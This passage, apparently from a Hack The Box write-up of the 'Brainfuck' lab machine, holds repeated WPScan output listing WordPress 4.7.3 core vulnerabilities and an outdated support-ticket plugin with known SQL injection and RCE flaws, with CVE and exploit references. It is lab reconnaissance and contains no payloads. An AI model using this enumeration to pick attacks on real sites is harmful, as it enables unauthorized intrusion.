https://wpvulndb.com/vulnerabilities/8912 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41397 | | [!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8913 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41448 | | [!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8914 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41395 | - https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html | | [!] Title: WordPress = 4.8.2 - $wpdb- prepare() Weakness | Fixed in: 4.7.7 | References: | - https://wpvulndb.com/vulnerabilities/8941 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510 | - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/ | - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d | - https://twitter.com/ircmaxell/status/923662170092638208 | - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html | | [!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload | Fixed in: 4.7.8 | References: | - https://wpvulndb.com/vulnerabilities/8966 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509 | | [!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping | Fixed in: 4.7.8 | References: | - https://wpvulndb.com/vulnerabilities/8967 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de | | [!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping | Fixed in: 4.7.8 | References: | - https://wpvulndb.com/vulnerabilities/8968 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a | | [!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing | Fixed in: 4.7.8 | References: | - https://wpvulndb.com/vulnerabilities/8969 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c | | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS) | Fixed in: 4.7.9 | References: | - https://wpvulndb.com/vulnerabilities/9006 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776 | - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850 | - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/ticket/42720 | | [!] Title: WordPress = 4.9.4 - Application Denial of Service (DoS) (unpatched) | References: | - https://wpvulndb.com/vulnerabilities/9021 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389 | - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html | - https://github.com/quitten/doser.py | - https://thehackernews.com/2018/02/wordpress-dos-exploit.html | | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default | Fixed in: 4.7.10 | References: | - https://wpvulndb.com/vulnerabilities/9053 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101 | - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216 | | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login | Fixed in: 4.7.10 | References: | - https://wpvulndb.com/vulnerabilities/9054 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100 | - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e | | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag | Fixed in: 4.7.10 | References: | - https://wpvulndb.com/vulnerabilities/9055 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102 | - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d | | [!] Title: WordPress = 4.9.6 - Authenticated Arbitrary File Deletion | Fixed in: 4.7.11 | References: | - https://wpvulndb.com/vulnerabilities/9100 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895 | - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/ | - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/ | - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd | - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/ | - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/ | | [!] Title: WordPress = 5.0 - Authenticated File Delete | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9169 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress = 5.0 - Authenticated Post Type Bypass | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9170 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/ | | [!] Title: WordPress = 5.0 - PHP Object Injection via Meta Data | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9171 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress = 5.0 - Authenticated Cross-Site Scripting (XSS) | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9172 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress = 5.0 - Cross-Site Scripting (XSS) that could affect plugins | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9173 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460 | | [!] Title: WordPress = 5.0 - User Activation Screen Search Engine Indexing | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9174 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress = 5.0 - File Upload to XSS on Apache Web Servers | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9175 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a | | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution | Fixed in: 5.0.1 | References: | - https://wpvulndb.com/vulnerabilities/9222 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942 | - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/ | | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS) | Fixed in: 4.7.13 | References: | - https://wpvulndb.com/vulnerabilities/9230 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787 | - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b | - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/ | - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/ [+] WordPress theme in use: proficient | Location: https://brainfuck.htb/wp-content/themes/proficient/ | Last Updated: 2018-02-16T00:00:00.000Z | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt | [!] The version is out of date, the latest version is 1.1.24 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3 | Style Name: Proficient | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof... | Author: Specia | Author URI: https://speciatheme.com/ | | Detected By: Css Style (Passive Detection) | | Version: 1.0.6 (80% confidence) | Detected By: Style (Passive Detection) | - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6' [+] Enumerating All Plugins [+] Checking Plugin Versions [i] Plugin(s) Identified: [+] wp-support-plus-responsive-ticket-system | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/ | Last Updated: 2019-04-16T06:36:00.000Z | [!] The version is out of date, the latest version is 9.1.2 | | Detected By: Urls In Homepage (Passive Detection) | | [!] 4 vulnerabilities identified: | | [!] Title: WP Support Plus Responsive Ticket System = 7.1.3 \u2013 Authenticated SQL Injection | Fixed in: 8.0.0 | References: | - https://wpvulndb.com/vulnerabilities/8699 | - https://www.exploit-db.com/exploits/40939/ | - http://lenonleite.com.br/en/blog/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/ | - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system | | [!] Title: WP Support Plus Responsive Ticket System = 8.0.7 - Remote Code Execution (RCE) | Fixed in: 8.0.8 | References: | - https://wpvulndb.com/vulnerabilities/8949 | - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system | | [!] Title: WP Support Plus Responsive Ticket System = 9.0.2 - Multiple Authenticated SQL Injection | Fixed in: 9.0.3 | References: | - https://wpvulndb.com/vulnerabilities/9041 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131 | - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md | - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system | | [!] Title: WP Support Plus Responsive Ticket System = 9.1.1 - Stored XSS | Fixed in: 9.1.2 | References: | - https://wpvulndb.com/vulnerabilities/9235 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299 | - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/ | - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system | | Version: 7.1.3 (100% confidence) | Detected By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt [+] Enumerating Config Backups Checking Config Backups - Time: 00:00:03 =========================================================================================================== (21 / 21) 100.00% Time: 00:00:03 [i] No Config Backups Found. [+] Finished: Tue Apr 23 07:33:00 2019 [+] Requests Done: 53 [+] Cached Requests: 4 [+] Data Sent: 10.006 KB [+] Data Received: 168.808 KB [+] Memory used: 86.762 MB [+] Elapsed time: 00:00:16","title":"WebServices"},{"location":"ctf/hack-the-box/brainfuck/01_Enumeration/WebServices/#nikto","text":"","title":"Nikto"},{"location":"ctf/hack-the-box/brainfuck/01_Enumeration/WebServices/#dirbuster-gobuster","text":"","title":"DirBuster / GoBuster"},{"location":"ctf/hack-the-box/brainfuck/01_Enumeration/WebServices/#webdav","text":"","title":"WebDav"},{"location":"ctf/hack-the-box/brainfuck/01_Enumeration/WebServices/#cms","text":"wpscan --url https://brainfuck.htb --disable-tls-checks _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ \u00ae \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.4.3 Sponsored by Sucuri - https://sucuri.net @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_ _______________________________________________________________ [+] URL: https://brainfuck.htb/ [+] Started: Tue Apr 23 07:32:44 2019 Interesting Finding(s): [+] https://brainfuck.htb/ | Interesting Entry: Server: nginx/1.10.0 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] https://brainfuck.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] https://brainfuck.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06). | Detected By: Rss Generator (Passive Detection) | - https://brainfuck.htb/?feed=rss2, generator https://wordpress.org/?v=4.7.3 /generator | - https://brainfuck.htb/?feed=comments-rss2, generator https://wordpress.org/?v=4.7.3 /generator | | [!] 34 vulnerabilities identified: | | [!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset | References: | - https://wpvulndb.com/vulnerabilities/8807 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295 | - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html | - http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html | - https://core.trac.wordpress.org/ticket/25239 | | [!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8815 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066 | - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | | [!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8816 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381 | | [!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8817 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4 | | [!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8818 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67 | - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html | | [!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8819 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6 | - https://hackerone.com/reports/203515 | - https://hackerone.com/reports/203515 | | [!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS CSRF | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8820 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063 | - https://wordpress.org/news/2017/05/wordpress-4-7-5/ | - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3 | | [!] Title: WordPress 2.3.0-4.8.1 - $wpdb- prepare() potential SQL Injection | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8905 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48 | - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec | | [!] Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection | Fixed in: 4.7.5 | References: | - https://wpvulndb.com/vulnerabilities/8906 | - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48 | - https://wpvulndb.com/vulnerabilities/8905 | | [!] Title: WordPress 2.9.2-4.8.1 - Open Redirect | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8910 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41398 | | [!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8911 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41457 | | [!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8912 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41397 | | [!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8913 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41448 | | [!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor | Fixed in: 4.7.6 | References: | - https://wpvulndb.com/vulnerabilities/8914 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726 | - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/changeset/41395 | - https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html | | [!] Title: WordPress = 4.8.2 - $wpdb- prepare() Weakness | Fixed in: 4.7.7 | References: | - https://wpvulndb.com/vulnerabilities/8941 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510 | - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/ | - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d | - https://twitter.com/ircmaxell/status/923662170092638208 | - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html | | [!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload | Fixed in: 4.7.8 | References: | - https://wpvulndb.com/vulnerabilities/8966 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509 | | [!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping | Fixed in: 4.7.8 | References: | - https://wpvulndb.com/vulnerabilities/8967 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de | | [!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping | Fixed in: 4.7.8 | References: | - https://wpvulndb.com/vulnerabilities/8968 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a | | [!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing | Fixed in: 4.7.8 | References: | - https://wpvulndb.com/vulnerabilities/8969 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091 | - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c | | [!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS) | Fixed in: 4.7.9 | References: | - https://wpvulndb.com/vulnerabilities/9006 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776 | - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850 | - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/ | - https://core.trac.wordpress.org/ticket/42720 | | [!] Title: WordPress = 4.9.4 - Application Denial of Service (DoS) (unpatched) | References: | - https://wpvulndb.com/vulnerabilities/9021 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389 | - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html | - https://github.com/quitten/doser.py | - https://thehackernews.com/2018/02/wordpress-dos-exploit.html | | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default | Fixed in: 4.7.10 | References: | - https://wpvulndb.com/vulnerabilities/9053 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101 | - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216 | | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login | Fixed in: 4.7.10 | References: | - https://wpvulndb.com/vulnerabilities/9054 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100 | - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e | | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag | Fixed in: 4.7.10 | References: | - https://wpvulndb.com/vulnerabilities/9055 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102 | - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d | | [!] Title: WordPress = 4.9.6 - Authenticated Arbitrary File Deletion | Fixed in: 4.7.11 | References: | - https://wpvulndb.com/vulnerabilities/9100 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895 | - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/ | - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/ | - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd | - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/ | - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/ | | [!] Title: WordPress = 5.0 - Authenticated File Delete | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9169 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress = 5.0 - Authenticated Post Type Bypass | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9170 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/ | | [!] Title: WordPress = 5.0 - PHP Object Injection via Meta Data | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9171 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress = 5.0 - Authenticated Cross-Site Scripting (XSS) | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9172 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress = 5.0 - Cross-Site Scripting (XSS) that could affect plugins | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9173 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460 | | [!] Title: WordPress = 5.0 - User Activation Screen Search Engine Indexing | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9174 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | [!] Title: WordPress = 5.0 - File Upload to XSS on Apache Web Servers | Fixed in: 4.7.12 | References: | - https://wpvulndb.com/vulnerabilities/9175 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a | | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution | Fixed in: 5.0.1 | References: | - https://wpvulndb.com/vulnerabilities/9222 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942 | - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/ | | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS) | Fixed in: 4.7.13 | References: | - https://wpvulndb.com/vulnerabilities/9230 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787 | - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b | - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/ | - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/ [+] WordPress theme in use: proficient | Location: https://brainfuck.htb/wp-content/themes/proficient/ | Last Updated: 2018-02-16T00:00:00.000Z | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt | [!] The version is out of date, the latest version is 1.1.24 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3 | Style Name: Proficient | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof... | Author: Specia | Author URI: https://speciatheme.com/ | | Detected By: Css Style (Passive Detection) | | Version: 1.0.6 (80% confidence) | Detected By: Style (Passive Detection) | - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6' [+] Enumerating All Plugins [+] Checking Plugin Versions [i] Plugin(s) Identified: [+] wp-support-plus-responsive-ticket-system | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/ | Last Updated: 2019-04-16T06:36:00.000Z | [!] The version is out of date, the latest version is 9.1.2 | | Detected By: Urls In Homepage (Passive Detection) | | [!] 4 vulnerabilities identified: | | [!] Title: WP Support Plus Responsive Ticket System = 7.1.3 \u2013 Authenticated SQL Injection | Fixed in: 8.0.0 | References: | - 